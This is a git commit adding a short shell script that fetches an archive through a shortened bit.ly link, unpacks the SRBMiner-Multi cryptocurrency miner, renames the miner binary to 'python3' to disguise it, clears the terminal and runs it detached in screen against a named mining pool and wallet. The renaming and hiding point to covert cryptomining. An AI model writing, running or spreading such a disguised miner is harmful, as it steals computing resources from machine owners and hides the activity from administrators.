85c39f23611cc1bb27f8d0a3690c13aa1a621d52
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-30 02:01:37 +0700

    Create dotrum.sh

---
+++ dotrum.sh
@@ -0,0 +1,16 @@
+
+mkdir dotrum
+
+cd dotrum
+
+wget https://bit.ly/kontolrum
+
+tar -xvf kontolrum
+
+cd SRBMiner-Multi-2-4-7
+
+mv SRBMiner-MULTI python3
+
+clear
+
+screen ./python3 --algorithm aurum --pool stratum-asia.rplant.xyz:7114 --wallet waf1qs7djrfr2kj4w8qkylva5tr24500l3nael0l34g.DOTcs-$nomer --keepalive true
